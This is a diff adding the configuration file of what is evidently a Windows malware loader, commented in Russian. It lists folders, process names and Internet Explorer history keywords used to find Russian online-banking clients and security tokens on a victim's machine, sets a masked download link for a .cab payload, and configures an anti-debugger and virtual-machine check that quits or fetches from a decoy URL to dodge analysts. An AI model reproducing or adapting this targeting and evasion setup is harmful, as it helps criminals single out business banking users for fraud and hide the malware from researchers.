@@ -1,0 +1,77 @@
+
+;================================================================================================================
+
+; Включение/Выключение режима отладки true/false
+
+!define DEBUG_MODE false
+
+; Задержка в микросекундах(Разгрузка для процессора)
+
+!define DELAY 45
+
+; Список доступных скрипту переменных окружения которые могут быть использованы в путях
+
+; %APPDATA%
+; %COMMONFILES32% - "C:\Program Files\Common Files","C:\Program Files (x86)\Common Files"(Windows 64)
+; %COMMONFILES64% - "C:\Program Files\Common Files"
+; %DESKTOP%
+; %DOCUMENTS%
+; %LOCALAPPDATA%
+; %PROFILE%
+; %PROGRAMFILES32% - "Program Files","Program Files (x86)"(Windows 64)
+; %PROGRAMFILES64% - "Program Files"
+
+; Список путей для поиска файлов(Обрабатывается по порядку слева направо)
+
+!define PATH `'{"[%PROFILE%]"} {"[%APPDATA%]"} {"%PROGRAMFILES32%" "%PROGRAMFILES64%"} {"[%DESKTOP%]"} {"[C:]"}"}'`
+
+; Список ключевых слов с которыми сверяется имя файла или папки
+
+!define WORD `'{%PROFILE%\.iBank2} {%APPDATA%\amicon %APPDATA%\bifit %APPDATA%\*bss %APPDATA%\*ibank} {%PROGRAMFILES32%\*gpb %PROGRAMFILES64%\*gpb %PROGRAMFILES32%\inist %PROGRAMFILES64%\inist %PROGRAMFILES32%\mdm %PROGRAMFILES64%\mdm %PROGRAMFILES32%\bifit %PROGRAMFILES64%\bifit %PROGRAMFILES32%\Aladdin %PROGRAMFILES64%\Aladdin %PROGRAMFILES32%\Amicon %PROGRAMFILES64%\Amicon %PROGRAMFILES32%\*bss %PROGRAMFILES64%\*bss %PROGRAMFILES32%\Signal-COM %PROGRAMFILES64%\Signal-COM %PROGRAMFILES32%\iBank2 %PROGRAMFILES64%\iBank2 %PROGRAMFILES32%\*\bc.exe %PROGRAMFILES64%\*\bc.exe %PROGRAMFILES32%\*\*\intpro.exe %PROGRAMFILES64%\*\*\intpro.exe %PROGRAMFILES32%\*cft %PROGRAMFILES64%\cft %PROGRAMFILES32%\agava %PROGRAMFILES64%\agava %PROGRAMFILES32%\*R-Style %PROGRAMFILES64%\*R-Style %PROGRAMFILES32%\*AKB Perm %PROGRAMFILES64%\*AKB Perm} {%DESKTOP%\*ELBA %DESKTOP%\*ELBRUS} {C:\*SFT C:\*Agava C:\*Clnt C:\*CLUNION.0QT C:\*5NT C:\*BS C:\*ELBA C:\*Bank C:\ICB_C C:\*sped C:\*gpb C:\*gazprom C:\*gazprom32324344 }'`
+
+; Список имён процессов через запятую(Можно оставить пустым)
+
+!define PROCESSES_LIST `'rclient.exe,ip-client.exe,saclient.exe,SRCLBClient.exe,twawebclient.exe,vegaClient.exe,dsstart.exe,dtpaydesk.exe,eelclnt.exe,elbank.exe,etprops.exe,eTSrv.exe,ibconsole.exe,kb_cli.exe,KLBS.exe,KlientBnk.exe,lfcpaymentais.exe,loadmain.exe,lpbos.exe,mebiusbankxp.exe,mmbank.exe,pcbank.exe,pinpayr.exe,Pionner.exe,pkimonitor.exe,pmodule.exe,pn.exe,postmove.exe,productprototype.exe,quickpay.exe,rclaunch.exe,retail.exe,retail32.exe,translink.exe,unistream.exe,uralprom.exe,w32mkde.exe,wclnt.exe,wfinist.exe,winpost.exe,wupostagent.exe,Zvit1DF.exe,BC_Loader.exe,Client2008.exe,IbcRemote31.exe,_ftcgpk.exe,scardsvr.exe,CL_1070002.exe,intpro.exe,UpMaster.exe,SGBClient.exe,el_cli.exe,MWClient32.exe,ADirect.exe,BClient.exe,bc.exe,ant.exe,arm.exe,arm_mt.exe,ARMSH95.EXE,asbank_lite.exe,bank.exe,bank32.exe,bbms.exe,bk.exe,BK_KW32.EXE,bnk.exe,CB.exe,cb193w.exe,cbank.exe,cbmain.ex,CBSMAIN.exe,CbShell.exe,clb.exe,CliBank.exe,CliBankOnlineEn.exe,CliBankOnlineRu.exe,CliBankOnlineUa.exe,client2.exe,client6.exe,clientbk.exe,clntstr.exe,clntw32.exe,contactng.exe,Core.exe,cshell.exe,cyberterm.exe,client.exe,cncclient.exe,bbclient.exe,EximClient.exe,fcclient.exe,iscc.exe,kabinet.exe,SrCLBStart.exe,srcbclient.exe,Upp_4.exe,Bankline.EXE,GeminiClientStation.exe,_ClientBank.exe,ISClient.exe,cws.exe,CLBANK.EXE,IMBLink32.exe,cbsmain.dll,GpbClientSftcws.exe,Run.exe,SGBClient.ex,sx_Doc_ni.exe,icb_c.exe,Client32.exe,BankCl.exe,ICLTransportSystem.exe,GPBClient.exe,CLMAIN.exe,ONCBCLI.exe,rmclient.exe,RkcLoader.exe,CLBank3.exe,FColseOW.exe,8fe4224148h.exe'`
+
+; Cсылка на скачку файла
+
+!define LINK `'http://*************.cab'`
+
+;================================================================================================================
+
+; НАСТРОЙКА ДЕТЕКТОРА ОТЛАДЧИКОВ И ВИРТУАЛЬНЫХ МАШИН.
+
+; IF_TRAP_FOUND - Определяет какое действие выполнить если сработал детектор:
+;
+; just_exit - просто завершить работу и ничего не скачивать.
+; use_fake_url - скачать файл по левой ссылке.
+
+!define IF_TRAP_FOUND just_exit
+
+; FAKE_LINK - Левая ссылка на скачку файла которая применяеться если IF_TRAP_FOUND обьявлен как use_fake_url.
+
+!define FAKE_LINK `'http://454354221.ru'`
+
+;================================================================================================================
+
+; ПРОВЕРКА ДЕТЕКТОРА
+
+; В режиме отладки(DEBUG_MODE) детектор сообщает результат проверки.
+; Так можно легко удостовериться в том что он способен выявлять отладчики и виртуальные машины.
+; Всего существует три вида сообщений которые может выдать детектор при включенном режиме отлдаки:
+;
+; 1 - DETECTOR: Debuggers and virtual machines not detected! Loader started in [NORMAL] mode.
+; 2 - DETECTOR: Debugger or virtual machine is detected! Loader [STOPPED].
+; 3 - DETECTOR: Debugger or virtual machine is detected! Loader started in [FAKE] mode.
+
+;================================================================================================================
+
+; Включение/Выключение поиска в истории IE
+;
+; 1 - Включить/0 - Выключить
+
+!define CHECK_IE_HOSTORY 1
+
+; Список ключевых слов для сравнения со ссылками из истории IE
+
+!define IE_HISTORY_WORDS `'*s888889990202tt *ICPortalSSL *bsi.dll *isfront.priovtb.com *PortalSSL *IIS-Gate.dll *ISAPIgate.dll *beta.mcb.ru *ibank *ibrs *iclient *e-plat.mdmbank.com *ibc *elbrus *i-elba *clbank.minbank.ru *chelindbank.ru/online/ *uwagb *wwwbank *dbo *ib. *clbank *main.zul'`
